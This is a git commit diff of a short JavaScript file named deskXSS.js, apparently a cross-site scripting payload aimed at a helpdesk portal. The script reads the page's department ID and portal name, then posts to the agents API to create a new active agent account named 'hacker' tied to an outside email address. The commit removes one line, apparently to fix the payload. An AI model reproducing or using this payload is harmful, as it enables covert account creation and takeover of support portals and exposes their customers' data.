04872ddf8ae0802c19e68d209d43a1459105b7af
MadhuRamanathan <34675179+MadhuRamanathan@users.noreply.github.com>
2018-03-22 13:36:50 +0530

    Update deskXSS.js

--- deskXSS.js
+++ deskXSS.js
@@ -1,5 +1,4 @@
 var depId = SupportUI.Departments.departments[0].depid;
 var pname = SupportUI.CurrentPortal.portalName;
 var test = {"firstName":"","lastName":"hacker","associatedDepartmentIds":["'+depId+'"],"perType":"AgentPublic","aboutInfo":"","mobile":"","phone":"","extn":"","status":"ACTIVE","emailId":"dagruxx24@gmail.com"};
-test=JSON.parse(test);
 $.post("api/v1/agents?portalname="+pname,test);
